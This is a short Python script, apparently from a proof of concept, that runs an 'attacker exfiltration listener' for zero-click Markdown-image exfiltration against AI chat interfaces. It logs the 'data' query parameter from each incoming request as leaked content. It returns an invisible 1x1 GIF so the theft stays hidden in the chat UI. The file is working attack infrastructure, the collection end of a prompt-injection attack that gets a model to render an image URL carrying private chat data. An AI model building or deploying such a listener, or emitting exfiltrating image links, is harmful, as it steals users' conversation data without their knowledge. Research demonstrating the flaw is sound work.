from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

HOST = "127.0.0.1"
PORT = 8888

# 1x1 transparent GIF byte sequence so the victim's browser renders an invisible pixel
TRANSPARENT_1X1_GIF = (
    b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00"
    b"\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00"
    b"\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
)


class ExfiltrationHandler(BaseHTTPRequestHandler):
    """HTTP listener capturing client-side Markdown image exfiltration requests."""

    def do_GET(self) -> None:
        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)
        timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

        print("\n" + "=" * 70)
        print(f"[!] [{timestamp}] INCOMING CONNECTION FROM VICTIM BROWSER")
        print(f"    Path:       {self.path}")
        print(f"    User-Agent: {self.headers.get('User-Agent', 'Unknown')}")

        if "data" in query_params:
            leaked_data = query_params["data"][0]
            print(f"    [CRITICAL EXFILTRATION CAPTURED]: {leaked_data}")
        else:
            print("    [INFO] Probe received without 'data' parameter.")
        print("=" * 70)

        # Respond with a valid 1x1 transparent image to remain stealthy in the chat UI
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        self.end_headers()
        self.wfile.write(TRANSPARENT_1X1_GIF)

    def log_message(self, format: str, *args: object) -> None:
        # Suppress default noisy HTTP server stdout logging
        return


def run_listener() -> None:
    server = HTTPServer((HOST, PORT), ExfiltrationHandler)
    print(f"[*] Attacker Exfiltration Listener active on http://{HOST}:{PORT}")
    print("[*] Waiting for zero-click Markdown image callbacks... (Press Ctrl+C to stop)")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopping listener.")
        server.server_close()


if __name__ == "__main__":
    run_listener()
